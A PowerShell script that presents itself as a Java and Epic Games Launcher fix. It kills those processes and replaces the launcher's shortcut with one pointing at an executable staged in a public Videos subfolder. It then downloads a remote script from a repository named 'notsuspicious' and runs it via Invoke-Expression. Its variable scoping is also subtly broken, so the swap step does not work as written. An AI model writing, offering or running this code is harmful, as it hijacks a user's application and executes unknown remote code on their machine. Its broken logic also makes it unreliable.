# Attempt to stop processes if they are running
Stop-Process -Name "java", "javaw", "EpicGamesLauncher" -Force -ErrorAction SilentlyContinue

# Define variables
$counter = 0
$p = $null

# Function to find Epic Games Launcher.lnk
function FindEpicGamesLauncher {
    param (
        [string]$directory
    )
    Get-ChildItem -Path $directory -Recurse -Filter "Epic Games Launcher.lnk" -ErrorAction SilentlyContinue | ForEach-Object {
        $p = $_.FullName
    }
}

# Search for Epic Games Launcher.lnk in user directories
$userDirectories = Get-ChildItem -Path "C:\Users" -Directory -ErrorAction SilentlyContinue
foreach ($directory in $userDirectories) {
    FindEpicGamesLauncher -directory $directory.FullName
}

# If not found, search in Program Files directory
if (-not $p) {
    $programFilesDirectories = Get-ChildItem -Path "C:\Program Files" -Directory -ErrorAction SilentlyContinue
    foreach ($directory in $programFilesDirectories) {
        FindEpicGamesLauncher -directory $directory.FullName
    }
}

# If Epic Games Launcher.lnk is found, proceed with moving and renaming
if ($p) {
    $counter++
    $newPath = "C:\Users\Public\Videos\GraphicalUserInterface\EpicGamesLauncher$counter.lnk"
    Move-Item -Path $p -Destination $newPath -Force -ErrorAction SilentlyContinue
    $executablePath = "C:\Users\Public\Videos\GraphicalUserInterface\myapp\Epic Games Launcher.exe"
    Move-Item -Path $executablePath -Destination (Split-Path $p) -Force -ErrorAction SilentlyContinue
    Rename-Item -Path $newPath -NewName "Epic Games Launcher.lnk" -Force -ErrorAction SilentlyContinue
    Rename-Item -Path $executablePath -NewName "Epic Games Launcher.exe" -Force -ErrorAction SilentlyContinue
    Write-Host "Epic Games Launcher files moved and renamed successfully."
} else {
    Write-Host "Epic Games Launcher not found."
}

# Download and execute javafix.ps1 script
try {
    $javaFixScript = Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/javafix.ps1" -UseBasicParsing
    Invoke-Expression $javaFixScript.Content
    Write-Host "Java fix script executed successfully."
}
catch {
    Write-Host "Failed to execute Java fix script: $_"
}
